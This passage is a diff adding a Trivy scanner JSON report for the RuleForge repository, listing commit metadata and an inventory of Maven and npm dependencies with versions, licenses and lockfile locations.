@@ -1,0 +1,3421 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.70.0"
+  },
+  "ReportID": "019ddede-9119-7d5d-b9b2-baecd29218ca",
+  "CreatedAt": "2026-04-30T22:50:21.337878+08:00",
+  "ArtifactID": "sha256:6e8d4b31afb80103a974ed401b6ff58b1349fe6a6e57df08c1980dc1b84fa47c",
+  "ArtifactName": ".",
+  "ArtifactType": "repository",
+  "Metadata": {
+    "RepoURL": "git@github.com:simbataisa/Ruleforge.git",
+    "Branch": "main",
+    "Commit": "9bf8c02a0c0e536412b52f9687f86bde82516973",
+    "CommitMsg": "feat(ux): onboard design system and architecture documentation\n\nAdd brownfield onboarding artifacts including design system seed, UX personas, user journeys, and solution architecture snapshot. Render design system visualization as self-contained HTML. Update handoff log to reflect new onboarding entries.\n\nThe changes introduce foundational UX and architecture documentation to support the RuleForge project's ongoing development, providing a comprehensive starting point for design and technical decision-making.",
+    "Author": "Tuan Anh (Dennis) Dao \u003csimbataisa@gmail.com\u003e",
+    "Committer": "Tuan Anh (Dennis) Dao \u003csimbataisa@gmail.com\u003e"
+  },
+  "Results": [
+    {
+      "Target": "engine/ruleforge-core/build/tmp/.cache/expanded/zip_cde35f471dab581134460fc9a50e2c59/META-INF/maven/org.jacoco/org.jacoco.agent/pom.xml",
+      "Class": "lang-pkgs",
+      "Type": "pom",
+      "Packages": [
+        {
+          "ID": "org.jacoco:org.jacoco.agent:0.8.11::eaade107",
+          "Name": "org.jacoco:org.jacoco.agent",
+          "Identifier": {
+            "PURL": "pkg:maven/org.jacoco/org.jacoco.agent@0.8.11",
+            "UID": "8c5df29d1ec7cd7f"
+          },
+          "Version": "0.8.11",
+          "Licenses": [
+            "EPL-2.0"
+          ],
+          "Relationship": "root",
+          "AnalyzedBy": "pom"
+        }
+      ]
+    },
+    {
+      "Target": "engine/ruleforge-ensemble/build/tmp/.cache/expanded/zip_cde35f471dab581134460fc9a50e2c59/META-INF/maven/org.jacoco/org.jacoco.agent/pom.xml",
+      "Class": "lang-pkgs",
+      "Type": "pom",
+      "Packages": [
+        {
+          "ID": "org.jacoco:org.jacoco.agent:0.8.11::38604f8d",
+          "Name": "org.jacoco:org.jacoco.agent",
+          "Identifier": {
+            "PURL": "pkg:maven/org.jacoco/org.jacoco.agent@0.8.11",
+            "UID": "a28d0da2a33edc59"
+          },
+          "Version": "0.8.11",
+          "Licenses": [
+            "EPL-2.0"
+          ],
+          "Relationship": "root",
+          "AnalyzedBy": "pom"
+        }
+      ]
+    },
+    {
+      "Target": "engine/ruleforge-flow/build/tmp/.cache/expanded/zip_cde35f471dab581134460fc9a50e2c59/META-INF/maven/org.jacoco/org.jacoco.agent/pom.xml",
+      "Class": "lang-pkgs",
+      "Type": "pom",
+      "Packages": [
+        {
+          "ID": "org.jacoco:org.jacoco.agent:0.8.11::84f85141",
+          "Name": "org.jacoco:org.jacoco.agent",
+          "Identifier": {
+            "PURL": "pkg:maven/org.jacoco/org.jacoco.agent@0.8.11",
+            "UID": "8bd40ec7f5cb3ba2"
+          },
+          "Version": "0.8.11",
+          "Licenses": [
+            "EPL-2.0"
+          ],
+          "Relationship": "root",
+          "AnalyzedBy": "pom"
+        }
+      ]
+    },
+    {
+      "Target": "frontend/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "@monaco-editor/react@4.7.0",
+          "Name": "@monaco-editor/react",
+          "Identifier": {
+            "PURL": "pkg:npm/%40monaco-editor/react@4.7.0",
+            "UID": "1fb4a2becfc877d6"
+          },
+          "Version": "4.7.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@monaco-editor/loader@1.7.0",
+            "monaco-editor@0.55.1",
+            "react-dom@18.3.1",
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1154,
+              "EndLine": 1167
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@tanstack/react-query@5.90.21",
+          "Name": "@tanstack/react-query",
+          "Identifier": {
+            "PURL": "pkg:npm/%40tanstack/react-query@5.90.21",
+            "UID": "354ebc5396bb137a"
+          },
+          "Version": "5.90.21",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@tanstack/query-core@5.90.20",
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1669,
+              "EndLine": 1684
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@tanstack/react-virtual@3.13.18",
+          "Name": "@tanstack/react-virtual",
+          "Identifier": {
+            "PURL": "pkg:npm/%40tanstack/react-virtual@3.13.18",
+            "UID": "d11fd93b3a9dda90"
+          },
+          "Version": "3.13.18",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@tanstack/virtual-core@3.13.18",
+            "react-dom@18.3.1",
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1685,
+              "EndLine": 1701
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/react@18.3.28",
+          "Name": "@types/react",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/react@18.3.28",
+            "UID": "d3c8e3871a70bd0d"
+          },
+          "Version": "18.3.28",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@types/prop-types@15.7.15",
+            "csstype@3.2.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1973,
+              "EndLine": 1983
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@xyflow/react@12.10.1",
+          "Name": "@xyflow/react",
+          "Identifier": {
+            "PURL": "pkg:npm/%40xyflow/react@12.10.1",
+            "UID": "8722b9848ec3f4e6"
+          },
+          "Version": "12.10.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@xyflow/system@0.0.75",
+            "classcat@5.0.5",
+            "react-dom@18.3.1",
+            "react@18.3.1",
+            "zustand@4.5.7"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2424,
+              "EndLine": 2438
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "axios@1.15.2",
+          "Name": "axios",
+          "Identifier": {
+            "PURL": "pkg:npm/axios@1.15.2",
+            "UID": "86bb64e64b3b3c5b"
+          },
+          "Version": "1.15.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "follow-redirects@1.16.0",
+            "form-data@4.0.5",
+            "proxy-from-env@2.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2631,
+              "EndLine": 2641
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "clsx@2.1.1",
+          "Name": "clsx",
+          "Identifier": {
+            "PURL": "pkg:npm/clsx@2.1.1",
+            "UID": "97c352f838a6b386"
+          },
+          "Version": "2.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 2885,
+              "EndLine": 2893
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lucide-react@0.424.0",
+          "Name": "lucide-react",
+          "Identifier": {
+            "PURL": "pkg:npm/lucide-react@0.424.0",
+            "UID": "19195daa384c4d42"
+          },
+          "Version": "0.424.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 4416,
+              "EndLine": 4424
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react@18.3.1",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@18.3.1",
+            "UID": "f8ad3b80f7b5a4e"
+          },
+          "Version": "18.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5059,
+              "EndLine": 5070
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@18.3.1",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@18.3.1",
+            "UID": "263e4a1afb86ccc9"
+          },
+          "Version": "18.3.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0",
+            "react@18.3.1",
+            "scheduler@0.23.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5071,
+              "EndLine": 5083
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-router-dom@6.30.3",
+          "Name": "react-router-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-router-dom@6.30.3",
+            "UID": "1beb00a86b3f8e8a"
+          },
+          "Version": "6.30.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@remix-run/router@1.23.2",
+            "react-dom@18.3.1",
+            "react-router@6.30.3",
+            "react@18.3.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5139,
+              "EndLine": 5155
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "recharts@3.7.0",
+          "Name": "recharts",
+          "Identifier": {
+            "PURL": "pkg:npm/recharts@3.7.0",
+            "UID": "9fc4cbe6d31e1cd5"
+          },
+          "Version": "3.7.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@reduxjs/toolkit@2.11.2",
+            "clsx@2.1.1",
+            "decimal.js-light@2.5.1",
+            "es-toolkit@1.44.0",
+            "eventemitter3@5.0.4",
+            "immer@10.2.0",
+            "react-dom@18.3.1",
+            "react-is@17.0.2",
+            "react-redux@9.2.0",
+            "react@18.3.1",
+            "reselect@5.1.1",
+            "tiny-invariant@1.3.3",
+            "use-sync-external-store@1.6.0",
+            "victory-vendor@37.3.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 5179,
+              "EndLine": 5208
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tailwind-merge@2.6.1",
+          "Name": "tailwind-merge",
+          "Identifier": {
+            "PURL": "pkg:npm/tailwind-merge@2.6.1",
+            "UID": "cfdd85e6ee57c928"
+          },
+          "Version": "2.6.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 5550,
+              "EndLine": 5559
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "zustand@4.5.7",
+          "Name": "zustand",
+          "Identifier": {
+            "PURL": "pkg:npm/zustand@4.5.7",
+            "UID": "69f48b9a20611b21"
+          },
+          "Version": "4.5.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@types/react@18.3.28",
+            "immer@10.2.0",
+            "react@18.3.1",
+            "use-sync-external-store@1.6.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 6244,
+              "EndLine": 6271
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@monaco-editor/loader@1.7.0",
+          "Name": "@monaco-editor/loader",
+          "Identifier": {
+            "PURL": "pkg:npm/%40monaco-editor/loader@1.7.0",
+            "UID": "ea3347ac28c06223"
+          },
+          "Version": "1.7.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "state-local@1.0.7"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1145,
+              "EndLine": 1153
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@reduxjs/toolkit@2.11.2",
+          "Name": "@reduxjs/toolkit",
+          "Identifier": {
+            "PURL": "pkg:npm/%40reduxjs/toolkit@2.11.2",
+            "UID": "41e4c57095a5ac3f"
+          },
+          "Version": "2.11.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@standard-schema/spec@1.1.0",
+            "@standard-schema/utils@0.3.0",
+            "immer@11.1.4",
+            "react-redux@9.2.0",
+            "react@18.3.1",
+            "redux-thunk@3.1.0",
+            "redux@5.0.1",
+            "reselect@5.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1206,
+              "EndLine": 1231
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@remix-run/router@1.23.2",
+          "Name": "@remix-run/router",
+          "Identifier": {
+            "PURL": "pkg:npm/%40remix-run/router@1.23.2",
+            "UID": "933bbac03b8d7c90"
+          },
+          "Version": "1.23.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1242,
+              "EndLine": 1250
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@standard-schema/spec@1.1.0",
+          "Name": "@standard-schema/spec",
+          "Identifier": {
+            "PURL": "pkg:npm/%40standard-schema/spec@1.1.0",
+            "UID": "6c32bb92ceb754ce"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1647,
+              "EndLine": 1652
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@standard-schema/utils@0.3.0",
+          "Name": "@standard-schema/utils",
+          "Identifier": {
+            "PURL": "pkg:npm/%40standard-schema/utils@0.3.0",
+            "UID": "3ee63b48fff8a956"
+          },
+          "Version": "0.3.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1653,
+              "EndLine": 1658
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@tanstack/query-core@5.90.20",
+          "Name": "@tanstack/query-core",
+          "Identifier": {
+            "PURL": "pkg:npm/%40tanstack/query-core@5.90.20",
+            "UID": "27c9bb777df76afc"
+          },
+          "Version": "5.90.20",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1659,
+              "EndLine": 1668
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@tanstack/virtual-core@3.13.18",
+          "Name": "@tanstack/virtual-core",
+          "Identifier": {
+            "PURL": "pkg:npm/%40tanstack/virtual-core@3.13.18",
+            "UID": "7ea1258ca564c41c"
+          },
+          "Version": "3.13.18",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1702,
+              "EndLine": 1711
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-array@3.2.2",
+          "Name": "@types/d3-array",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-array@3.2.2",
+            "UID": "ec0b8dc57eadebb5"
+          },
+          "Version": "3.2.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1855,
+              "EndLine": 1860
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-color@3.1.3",
+          "Name": "@types/d3-color",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-color@3.1.3",
+            "UID": "d13804bd2d6a1189"
+          },
+          "Version": "3.1.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1861,
+              "EndLine": 1866
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-drag@3.0.7",
+          "Name": "@types/d3-drag",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-drag@3.0.7",
+            "UID": "a849418460fd9eec"
+          },
+          "Version": "3.0.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-selection@3.0.11"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1867,
+              "EndLine": 1875
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-ease@3.0.2",
+          "Name": "@types/d3-ease",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-ease@3.0.2",
+            "UID": "ec87f2093a082c08"
+          },
+          "Version": "3.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1876,
+              "EndLine": 1881
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-interpolate@3.0.4",
+          "Name": "@types/d3-interpolate",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-interpolate@3.0.4",
+            "UID": "9fec3645dc50460b"
+          },
+          "Version": "3.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-color@3.1.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1882,
+              "EndLine": 1890
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-path@3.1.1",
+          "Name": "@types/d3-path",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-path@3.1.1",
+            "UID": "9d5622a78fd0f0e1"
+          },
+          "Version": "3.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1891,
+              "EndLine": 1896
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-scale@4.0.9",
+          "Name": "@types/d3-scale",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-scale@4.0.9",
+            "UID": "a1f39cd9d77123a8"
+          },
+          "Version": "4.0.9",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-time@3.0.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1897,
+              "EndLine": 1905
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-selection@3.0.11",
+          "Name": "@types/d3-selection",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-selection@3.0.11",
+            "UID": "da15bd1bb28cd636"
+          },
+          "Version": "3.0.11",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1906,
+              "EndLine": 1911
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-shape@3.1.8",
+          "Name": "@types/d3-shape",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-shape@3.1.8",
+            "UID": "e720e312dd971e82"
+          },
+          "Version": "3.1.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-path@3.1.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1912,
+              "EndLine": 1920
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-time@3.0.4",
+          "Name": "@types/d3-time",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-time@3.0.4",
+            "UID": "dbdaf8b45955ffa3"
+          },
+          "Version": "3.0.4",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1921,
+              "EndLine": 1926
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-timer@3.0.2",
+          "Name": "@types/d3-timer",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-timer@3.0.2",
+            "UID": "6f41b1dbbec63e0b"
+          },
+          "Version": "3.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1927,
+              "EndLine": 1932
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-transition@3.0.9",
+          "Name": "@types/d3-transition",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-transition@3.0.9",
+            "UID": "7354f2d7c1dc0d24"
+          },
+          "Version": "3.0.9",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-selection@3.0.11"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1933,
+              "EndLine": 1941
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/d3-zoom@3.0.8",
+          "Name": "@types/d3-zoom",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/d3-zoom@3.0.8",
+            "UID": "122af98a1ca3cb63"
+          },
+          "Version": "3.0.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-interpolate@3.0.4",
+            "@types/d3-selection@3.0.11"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1942,
+              "EndLine": 1951
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/prop-types@15.7.15",
+          "Name": "@types/prop-types",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/prop-types@15.7.15",
+            "UID": "ac4ddb78be900bdc"
+          },
+          "Version": "15.7.15",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1966,
+              "EndLine": 1972
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/trusted-types@2.0.7",
+          "Name": "@types/trusted-types",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/trusted-types@2.0.7",
+            "UID": "b780bf6c4922bcd7"
+          },
+          "Version": "2.0.7",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1994,
+              "EndLine": 2001
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@types/use-sync-external-store@0.0.6",
+          "Name": "@types/use-sync-external-store",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/use-sync-external-store@0.0.6",
+            "UID": "e5e47e1a6d83874"
+          },
+          "Version": "0.0.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2002,
+              "EndLine": 2007
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@xyflow/system@0.0.75",
+          "Name": "@xyflow/system",
+          "Identifier": {
+            "PURL": "pkg:npm/%40xyflow/system@0.0.75",
+            "UID": "8c081849f319f09f"
+          },
+          "Version": "0.0.75",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@types/d3-drag@3.0.7",
+            "@types/d3-interpolate@3.0.4",
+            "@types/d3-selection@3.0.11",
+            "@types/d3-transition@3.0.9",
+            "@types/d3-zoom@3.0.8",
+            "d3-drag@3.0.0",
+            "d3-interpolate@3.0.1",
+            "d3-selection@3.0.0",
+            "d3-zoom@3.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2439,
+              "EndLine": 2455
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "asynckit@0.4.0",
+          "Name": "asynckit",
+          "Identifier": {
+            "PURL": "pkg:npm/asynckit@0.4.0",
+            "UID": "73bb8ceb538a485e"
+          },
+          "Version": "0.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2588,
+              "EndLine": 2593
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "call-bind-apply-helpers@1.0.2",
+          "Name": "call-bind-apply-helpers",
+          "Identifier": {
+            "PURL": "pkg:npm/call-bind-apply-helpers@1.0.2",
+            "UID": "b4aed15846d9fdb4"
+          },
+          "Version": "1.0.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "es-errors@1.3.0",
+            "function-bind@1.1.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2743,
+              "EndLine": 2755
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "classcat@5.0.5",
+          "Name": "classcat",
+          "Identifier": {
+            "PURL": "pkg:npm/classcat@5.0.5",
+            "UID": "8ca13ca64cf90de9"
+          },
+          "Version": "5.0.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2879,
+              "EndLine": 2884
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "combined-stream@1.0.8",
+          "Name": "combined-stream",
+          "Identifier": {
+            "PURL": "pkg:npm/combined-stream@1.0.8",
+            "UID": "a4ed75be71e1458c"
+          },
+          "Version": "1.0.8",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "delayed-stream@1.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2914,
+              "EndLine": 2925
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "csstype@3.2.3",
+          "Name": "csstype",
+          "Identifier": {
+            "PURL": "pkg:npm/csstype@3.2.3",
+            "UID": "d14c56f600fd2407"
+          },
+          "Version": "3.2.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3006,
+              "EndLine": 3012
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-array@3.2.4",
+          "Name": "d3-array",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-array@3.2.4",
+            "UID": "e1ad7dfe229f6ce7"
+          },
+          "Version": "3.2.4",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "internmap@2.0.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3013,
+              "EndLine": 3024
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-color@3.1.0",
+          "Name": "d3-color",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-color@3.1.0",
+            "UID": "dd809c08e5e8e096"
+          },
+          "Version": "3.1.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3025,
+              "EndLine": 3033
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-dispatch@3.0.1",
+          "Name": "d3-dispatch",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-dispatch@3.0.1",
+            "UID": "603c11c6c45ae0e7"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3034,
+              "EndLine": 3042
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-drag@3.0.0",
+          "Name": "d3-drag",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-drag@3.0.0",
+            "UID": "bbb6cfcabe2279b0"
+          },
+          "Version": "3.0.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-dispatch@3.0.1",
+            "d3-selection@3.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3043,
+              "EndLine": 3055
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-ease@3.0.1",
+          "Name": "d3-ease",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-ease@3.0.1",
+            "UID": "b74d6e703bd524ad"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3056,
+              "EndLine": 3064
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-format@3.1.2",
+          "Name": "d3-format",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-format@3.1.2",
+            "UID": "93c8e09a0209b07d"
+          },
+          "Version": "3.1.2",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 3065,
+              "EndLine": 3073
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "d3-interpolate@3.0.1",
+          "Name": "d3-interpolate",
+          "Identifier": {
+            "PURL": "pkg:npm/d3-interpolate@3.0.1",
+            "UID": "e05e8b0fe100acd5"
+          },
+          "Version": "3.0.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "d3-color@3.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3074,
+              "EndLine": 3085
